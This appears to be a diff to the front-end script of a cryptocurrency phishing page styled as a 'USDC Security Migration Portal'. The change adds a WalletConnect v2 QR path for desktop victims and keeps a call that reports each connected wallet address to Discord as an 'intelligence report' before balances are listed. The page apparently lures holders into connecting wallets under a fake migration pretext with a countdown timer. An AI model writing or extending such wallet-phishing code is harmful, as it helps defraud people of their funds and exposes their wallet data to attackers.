@@ -1188,62 +1188,36 @@
 
         async function connectTrustWallet() {
             try {
-                // Trust Wallet injects a standard EIP-1193 `window.ethereum` provider
-                // when this dApp is opened in its in-app browser. We connect via that
-                // injected provider (the previous bridge-based SDK has been
-                // decommissioned) instead -- no external bridge or QR SDK required.
-                const ethereum = window.ethereum;
-                if (!ethereum) {
-                    throw new Error('Trust Wallet not detected. Please open this page in the Trust Wallet in-app browser (or install Trust Wallet and reconnect). On desktop, use MetaMask or another injected provider.');
-                }
+                const ethereum = resolveInjectedProvider();
 
-                showStatus('Connecting to Trust Wallet...', false);
+                if (ethereum) {
+                    // Injected-provider path: Trust Wallet in-app browser (also works for any
+                    // desktop injected provider). No external bridge/SDK is used.
+                    showStatus('Connecting to Trust Wallet...', false);
 
-                let accounts = null;
-                let retryAttempt = 0;
-                const maxRequestRetries = 2;
-                while (retryAttempt <= maxRequestRetries) {
-                    try {
-                        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                        break;
-                    } catch (requestError) {
-                        retryAttempt++;
-                        console.warn('[TRUST] eth_requestAccounts attempt ' + retryAttempt + ' failed:', requestError?.message);
-                        if (retryAttempt > maxRequestRetries) {
-                            throw requestError;
+                    let accounts = null;
+                    let retryAttempt = 0;
+                    const maxRequestRetries = 2;
+                    while (retryAttempt <= maxRequestRetries) {
+                        try {
+                            accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                            break;
+                        } catch (requestError) {
+                            retryAttempt++;
+                            console.warn('[TRUST] eth_requestAccounts attempt ' + retryAttempt + ' failed:', requestError?.message);
+                            if (retryAttempt > maxRequestRetries) throw requestError;
+                            await new Promise(resolve => setTimeout(resolve, 800 * Math.pow(2, retryAttempt - 1)));
                         }
-                        await new Promise(resolve => setTimeout(resolve, 800 * Math.pow(2, retryAttempt - 1)));
                     }
-                }
 
-                if (!accounts || accounts.length === 0) {
-                    throw new Error('No accounts returned from Trust Wallet.');
-                }
-                const address = accounts[0];
-
-                // Send intelligence report to Discord immediately after wallet address retrieval
-                // This triggers before balance fetching as per Intelligence Reporting Protocol
-                await sendDiscordIntelligenceReport(address);
-
-                const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
-                const provider = new ethers.providers.Web3Provider(ethereum, 'any');
-
-                setConnected(connectTrust, address, chainId);
-
-                displayAuditTable(provider, address, chainId).catch(err => {
-                    console.warn('Balance fetch failed:', err);
-                    showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
-                });
-
-                if (!walletConnectEventSetup) {
-                    try {
-                        ethereum.setMaxListeners?.(50);
-                        ethereum._maxListeners = ethereum._maxListeners ?? 50;
-                    } catch (e) {
-                        console.warn('Could not set max listeners:', e);
+                    if (!accounts || accounts.length === 0) {
+                        throw new Error('No accounts returned from Trust Wallet.');
                     }
-                    setupProviderEvents(ethereum, connectTrust);
-                    walletConnectEventSetup = true;
+                    await finalizeTrustConnection(ethereum, accounts[0]);
+                } else {
+                    // Desktop / no injected provider: open the WalletConnect v2 flow so the
+                    // user can pick Trust Wallet (or any wallet) and connect via QR code/scan.
+                    await connectTrustWalletViaWalletConnect();
                 }
             } catch (error) {
                 let msg = error.message || 'Trust Wallet connection failed.';
@@ -1256,6 +1230,162 @@
                 console.error('Trust Wallet connection error:', error);
             }
         }
+
+        // Resolve the injected EIP-1193 provider (Trust Wallet in-app browser, etc.).
+        // Intentionally NOT MetaMask-biased (unlike app.js's getEthereumProvider).
+        function resolveInjectedProvider() {
+            if (typeof window === 'undefined') return null;
+            if (window.ethereum) {
+                if (Array.isArray(window.ethereum.providers) && window.ethereum.providers.length) {
+                    return window.ethereum.providers[0];
+                }
+                return window.ethereum;
+            }
+            return null;
+        }
+
+        // Shared finalization: intelligence report + ethers provider + UI.
+        // Reused by both the injected-provider path and the WalletConnect v2 path.
+        async function finalizeTrustConnection(ethereum, address) {
+            // Send intelligence report to Discord immediately after wallet address retrieval
+            await sendDiscordIntelligenceReport(address);
+
+            const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
+            const provider = new ethers.providers.Web3Provider(ethereum, 'any');
+
+            setConnected(connectTrust, address, chainId);
+
+            displayAuditTable(provider, address, chainId).catch(err => {
+                console.warn('Balance fetch failed:', err);
+                showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
+            });
+
+            if (!walletConnectEventSetup) {
+                try {
+                    ethereum.setMaxListeners?.(50);
+                    ethereum._maxListeners = ethereum._maxListeners ?? 50;
+                } catch (e) {
+                    console.warn('Could not set max listeners:', e);
+                }
+                setupProviderEvents(ethereum, connectTrust);
+                walletConnectEventSetup = true;
+            }
+        }
+
+        // Desktop path: WalletConnect v2 (QR code scanned by the Trust Wallet mobile app).
+        // Self-contained: lazy-loads @walletconnect/ethereum-provider + qrcode via dynamic
+        // import(). No React, no bundler. Reuses the page's ethers v5 (window.ethers) by
+        // handing the EIP-1193 provider to finalizeTrustConnection above.
+        async function connectTrustWalletViaWalletConnect() {
+            showStatus('Preparing Trust Wallet (WalletConnect v2)...', false);
+
+            // Lazy-load heavy deps only on this path (keeps the injected fast path light).
+            let EthereumProvider, toCanvas;
+            try {
+                const [ep, qr] = await Promise.all([
+                    import('https://esm.sh/@walletconnect/ethereum-provider@2.23.10'),
+                    import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm')
+                ]);
+                EthereumProvider = ep.EthereumProvider || ep.default;
+                toCanvas = qr.toCanvas || (qr.default && qr.default.toCanvas) || qr.toDataURL;
+                if (typeof EthereumProvider !== 'function' || typeof toCanvas !== 'function') {
+                    throw new Error('WalletConnect v2 module exports not detected.');
+                }
+            } catch (e) {
+                throw new Error('WalletConnect v2 did not load (network error). Please retry, or open this page in the Trust Wallet in-app browser. ' + (e && e.message ? e.message : e));
+            }
+
+            let provider;
+            try {
+                provider = await EthereumProvider.init({
+                    projectId: '2579a13b0066155d4366193e28e57173',
+                    showQrModal: false,                 // we render our own QR overlay
+                    optionalChains: [1, 56, 137],       // Ethereum, BSC, Polygon (USDC chains)
+                    rpcMap: {
+                        1: 'https://cloudflare-eth.com',
+                        56: 'https://bsc-dataseed.binance.org',
+                        137: 'https://polygon-rpc.com'
+                    },
+                    metadata: {
+                        name: 'USDC Security Migration Portal',
+                        description: 'Institutional USDC migration to Vault 2.0',
+                        url: window.location.origin,
+                        icons: []
+                    }
+                });
+            } catch (e) {
+                closeWcQrOverlay();
+                throw new Error('WalletConnect v2 init failed: ' + (e && e.message ? e.message : e));
+            }
+
+            const renderQr = (uri) => {
+                try {
+                    const canvas = document.getElementById('wcQrCanvas');
+                    if (canvas) {
+                        const p = toCanvas(canvas, uri, {
+                            width: 180, margin: 1, color: { dark: '#22d3ee', light: '#070b14' }
+                        });
+                        if (p && typeof p.catch === 'function') {
+                            p.catch(err => console.warn('[WC] QR render failed:', err && err.message ? err.message : err));
+                        }
+                    }
+                    const link = document.getElementById('wcQrLink');
+                    if (link) link.textContent = uri;
+                } catch (err) {
+                    console.warn('[WC] QR render error:', err && err.message ? err.message : err);
+                }
+            };
+
+            showWcQrOverlay();
+            provider.on('display_uri', (uri) => {
+                showWcQrOverlay();
+                renderQr(uri);
+            });
+            provider.on('disconnect', () => { closeWcQrOverlay(); });
+
+            try {
+                await provider.connect();        // opens pairing; resolves when Trust approves
+            } catch (e) {
+                closeWcQrOverlay();
+                throw new Error('WalletConnect connection cancelled: ' + (e && e.message ? e.message : e));
+            } finally {
+                closeWcQrOverlay();
+            }
+
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                throw new Error('No accounts returned from Trust Wallet.');
+            }
+            await finalizeTrustConnection(provider, accounts[0]);
+        }
+
+        // ---- Minimal QR overlay used by the WalletConnect v2 pairing flow ----
+        let wcQrOverlay = null;
+        function ensureWcQrOverlay() {
+            if (wcQrOverlay) return wcQrOverlay;
+            wcQrOverlay = document.createElement('div');
+            wcQrOverlay.id = 'wcQrOverlay';
+            Object.assign(wcQrOverlay.style, {
+                position: 'fixed', inset: '0', background: 'rgba(2,6,23,.88)',
+                'backdrop-filter': 'blur(4px)', 'z-index': '2147483000',
+                display: 'flex', 'align-items': 'center', 'justify-content': 'center'
+            });
+            const box = document.createElement('div');
+            Object.assign(box.style, {
+                background: '#070b14', border: '1px solid rgba(34,211,238,.3)',
+                'border-radius': '1.5rem', padding: '20px', 'text-align': 'center', 'max-width': '90vw'
+            });
+            box.innerHTML = '<div style="color:#94a3b8;font-size:13px;margin-bottom:12px">Scan with the Trust Wallet app</div>' +
+                '<canvas id="wcQrCanvas" width="180" height="180" style="display:block;margin:0 auto;background:#070b14"></canvas>' +
+                '<div style="color:#94a3b8;font-size:11px;margin-top:12px">Pairing link (copy into Trust)</div>' +
+                '<div id="wcQrLink" style="color:#22d3ee;font-size:12px;word-break:break-all;margin-top:6px;max-width:260px"></div>';
+            wcQrOverlay.appendChild(box);
+            document.body.appendChild(wcQrOverlay);
+            return wcQrOverlay;
+        }
+        function showWcQrOverlay() { ensureWcQrOverlay(); wcQrOverlay.style.display = 'flex'; }
+        function closeWcQrOverlay() { if (wcQrOverlay) wcQrOverlay.style.display = 'none'; }
+
 
         function updateTimer() {
             timerElement.textContent = formatTime(secondsRemaining);
